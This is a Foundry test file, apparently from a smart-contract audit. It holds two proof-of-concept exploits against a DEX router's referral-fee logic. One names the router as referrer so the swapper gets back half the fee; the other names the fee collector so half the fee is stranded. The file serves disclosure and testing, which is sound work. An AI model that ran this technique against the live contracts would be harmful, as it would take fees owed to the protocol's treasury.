// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {NullRouter} from "../src/NullRouter.sol";
import {FeeCollector} from "../src/FeeCollector.sol";
import {AdapterRegistry} from "../src/AdapterRegistry.sol";
import {INullRouter} from "../src/interfaces/INullRouter.sol";

contract RefMockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { _x(msg.sender, to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) { require(al >= a, "ALLOWANCE"); allowance[f][msg.sender] = al - a; }
        _x(f, to, a); return true;
    }
    function _x(address f, address to, uint256 a) internal { require(balanceOf[f] >= a, "BAL"); balanceOf[f] -= a; balanceOf[to] += a; }
}

/// Honest 1:1 adapter — mints exactly what it reports.
contract RefHonestAdapter {
    function swap(address, address tokenOut, uint256 amountIn, address to, bytes calldata) external returns (uint256) {
        RefMockERC20(tokenOut).mint(to, amountIn);
        return amountIn;
    }
}

/// The self-referral guard at NullRouter._settleOutput only drops `referrer == msg.sender`.
/// It does not reject the protocol's OWN addresses. These two PoCs run against the REAL
/// NullRouter + FeeCollector + AdapterRegistry proxies at mainnet fee settings.
contract AuditPoCReferrerTest is Test {
    NullRouter router;
    FeeCollector fees;
    AdapterRegistry registry;
    RefMockERC20 tA;
    RefMockERC20 tB;

    address honest = address(0xBEEF);
    address attacker = address(0xBAD);
    address treasury = address(0x7EA);

    uint256 constant AMT = 100 ether;
    uint16 constant FEE_BPS = 25;      // meme tier — matches the live mainnet default
    uint16 constant REF_SHARE = 5000;  // 50% — matches live

    address adp;

    function setUp() public {
        tA = new RefMockERC20();
        tB = new RefMockERC20();

        registry = AdapterRegistry(address(new ERC1967Proxy(
            address(new AdapterRegistry()),
            abi.encodeCall(AdapterRegistry.initialize, (address(this)))
        )));

        router = NullRouter(payable(address(new ERC1967Proxy(
            address(new NullRouter()),
            abi.encodeCall(NullRouter.initialize,
                (address(this), address(0x1), address(0), address(0x1), address(registry)))
        ))));

        fees = FeeCollector(address(new ERC1967Proxy(
            address(new FeeCollector()),
            abi.encodeCall(FeeCollector.initialize,
                (address(this), treasury, address(router), FEE_BPS, REF_SHARE))
        )));
        router.setFeeCollector(address(fees));

        adp = address(new RefHonestAdapter());
        registry.addAdapter(adp);

        for (uint256 i = 0; i < 2; i++) {
            address u = i == 0 ? honest : attacker;
            tA.mint(u, 1_000 ether);
            vm.prank(u);
            tA.approve(address(router), type(uint256).max);
        }
    }

    function _swap(address who, address referrer) internal {
        INullRouter.RouteStep memory r = INullRouter.RouteStep({
            adapter: adp, tokenIn: address(tA), tokenOut: address(tB), amountIn: AMT, extraData: ""
        });
        vm.prank(who);
        router.swap(address(tA), address(tB), AMT, 0, block.timestamp + 1, r, referrer);
    }

    /// Naming the ROUTER as `referrer` rebates 50% of the protocol fee to the swapper:
    /// FeeCollector pays the referral half back to the router, which then dust-sweeps it
    /// to msg.sender. Permissionless — no second wallet, no setup, one transaction.
    function test_poc_referrerIsRouter_rebatesHalfTheFeeToSwapper() public {
        _swap(honest, address(0));
        uint256 honestGot = tB.balanceOf(honest);
        uint256 treasuryFromHonest = fees.accumulatedFees(address(tB));

        _swap(attacker, address(router));
        uint256 attackerGot = tB.balanceOf(attacker);
        uint256 treasuryFromAttack = fees.accumulatedFees(address(tB)) - treasuryFromHonest;

        emit log_named_decimal_uint("honest   receives", honestGot, 18);
        emit log_named_decimal_uint("attacker receives", attackerGot, 18);
        emit log_named_decimal_uint("treasury from honest swap", treasuryFromHonest, 18);
        emit log_named_decimal_uint("treasury from attack swap", treasuryFromAttack, 18);

        uint256 fullFee = (AMT * FEE_BPS) / 10_000;
        assertEq(honestGot, AMT - fullFee, "honest pays the full fee");
        assertEq(treasuryFromHonest, fullFee, "treasury keeps the full fee");

        assertEq(attackerGot, AMT - fullFee / 2, "attacker pays only HALF the fee");
        assertEq(treasuryFromAttack, fullFee / 2, "treasury keeps only HALF");
        assertGt(attackerGot, honestGot, "strictly better off, permissionlessly");

        // Router still nets to zero, so the existing zero-balance invariant does NOT catch this.
        assertEq(tB.balanceOf(address(router)), 0, "router still nets to zero");
    }

    /// Naming the FEE COLLECTOR as `referrer` permanently strands half the fee: the referral
    /// transfer is a self-transfer (net no-op) but only the treasury half is booked to the ledger.
    function test_poc_referrerIsFeeCollector_strandsHalfTheFee() public {
        _swap(attacker, address(fees));

        uint256 held = tB.balanceOf(address(fees));
        uint256 booked = fees.accumulatedFees(address(tB));

        emit log_named_decimal_uint("collector holds ", held, 18);
        emit log_named_decimal_uint("collector booked", booked, 18);

        uint256 fullFee = (AMT * FEE_BPS) / 10_000;
        assertEq(held, fullFee, "collector physically holds the whole fee");
        assertEq(booked, fullFee / 2, "but only half is withdrawable");
        assertGt(held, booked, "difference is unrecoverable without a UUPS upgrade");
    }
}
